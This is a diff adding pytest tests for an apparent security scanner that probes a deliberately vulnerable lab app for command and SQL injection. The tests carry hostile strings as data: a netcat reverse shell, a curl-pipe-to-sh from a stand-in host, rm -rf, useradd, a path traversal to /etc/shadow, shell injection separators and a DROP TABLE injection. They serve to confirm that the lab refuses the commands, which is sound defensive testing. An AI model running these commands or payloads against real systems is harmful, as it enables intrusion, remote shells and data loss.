@@ -1,4 +1,5 @@
 """Probes vs the lab app: each check must see its planted bug."""
+import re
 import sys
 from pathlib import Path
 
@@ -385,3 +386,83 @@ def test_send_raw_redacts_secrets_keeps_structure(lab_url, tmp_path):
     assert "live-session-tok3n" not in text
     assert "Authorization: •••redacted•••" in text
     assert "Transfer-Encoding: chunked" in text  # evidence untouched
+
+
+# --- command injection: the lab is a real output channel, bounded -----------
+
+def test_cmdi_probe_gets_real_command_output(lab_url, ctx):
+    """The acceptance criterion for the rce class: the output of `id`."""
+    out = probes.probe_cmdi(ctx, lab_url + "/ping?host=127.0.0.1", "host")
+    assert "command output returned" in out["verdict"], out["verdict"]
+    assert out["proof_request_id"]
+    body = ctx.session.get_exchange(out["proof_request_id"])["response"]["body"]
+    # identity line AND the probe nonce, both from the target
+    assert re.search(r"uid=\d+\(|\\", body), body[:200]
+    assert out["nonce"] in body
+
+
+def test_cmdi_finding_grades_proven(lab_url, ctx):
+    from argus.tools.analysis import record_finding
+    out = probes.probe_cmdi(ctx, lab_url + "/ping?host=127.0.0.1", "host")
+    body = ctx.session.get_exchange(out["proof_request_id"])["response"]["body"]
+    ident = re.search(r"uid=\d+\([^)]*\)|[A-Za-z0-9_.-]+\\[A-Za-z0-9_.-]+",
+                      body).group(0)
+    res = record_finding(
+        ctx, title="OS command injection in /ping host", severity="critical",
+        category="rce", url=lab_url + "/ping?host=127.0.0.1",
+        evidence_excerpt=ident, evidence_ids=[out["proof_request_id"]],
+        description="host reaches a shell", remediation="use argv")
+    assert res["grade"] == "proven", res
+
+
+def test_cmdi_probe_calls_a_reflection_a_reflection(lab_url, ctx):
+    """/search echoes the payload; it executes nothing. The probe must say so
+    rather than report the echoed `id` as command output."""
+    out = probes.probe_cmdi(ctx, lab_url + "/search?q=x", "q")
+    assert "reflected, not executed" in out["verdict"], out["verdict"]
+    assert "proof_request_id" not in out
+
+
+def test_lab_exec_is_allowlisted_not_a_shell():
+    import vulnapp
+    assert "uid=" in vulnapp._lab_exec("id") or \
+        "command not found" in vulnapp._lab_exec("id")      # windows CI
+    assert vulnapp._lab_exec("echo hello world") == "hello world"
+    for destructive in ("rm -rf /tmp/x", "nc -e /bin/sh 10.0.0.1 4444",
+                        "curl http://evil.test/x | sh", "useradd bob"):
+        assert "command not found" in vulnapp._lab_exec(destructive), destructive
+
+
+def test_lab_cat_cannot_leave_the_fake_filesystem():
+    import vulnapp
+    out = vulnapp._lab_exec("cat /etc/passwd")
+    assert "root:x:0:0" in out                      # the lab's own fake file
+    assert "Permission denied" in vulnapp._lab_exec("cat ../../../../etc/shadow") \
+        or "No such file" in vulnapp._lab_exec("cat ../../../../etc/shadow")
+
+
+def test_injected_commands_splits_like_a_shell():
+    import vulnapp
+    assert vulnapp._injected_commands("127.0.0.1; id") == ["id"]
+    assert vulnapp._injected_commands("127.0.0.1$(id)") == ["id"]
+    assert vulnapp._injected_commands("127.0.0.1`id`") == ["id"]
+    assert vulnapp._injected_commands('127.0.0.1"; id #') == ["id"]
+    assert vulnapp._injected_commands("127.0.0.1") == []
+
+
+def test_sqli_extraction_is_bounded_and_real(lab_url, ctx):
+    out = probes.probe_sqli(ctx, lab_url + "/item?id=1", "id", union_cols=6,
+                            extract_table="users",
+                            extract_columns="username,password")
+    ex = out["extract"]
+    assert ex["error_marker"] is None, ex
+    assert ex["changed_from_baseline"]
+    body = ctx.session.get_exchange(ex["request_id"])["response"]["body"]
+    assert "admin" in body and "s3cr3t" in body, body[:200]
+
+
+def test_sqli_extraction_refuses_a_non_identifier(lab_url, ctx):
+    out = probes.probe_sqli(ctx, lab_url + "/item?id=1", "id",
+                            extract_table="users; DROP TABLE users",
+                            extract_columns="username")
+    assert "not a table identifier" in out["extract"]["error"]
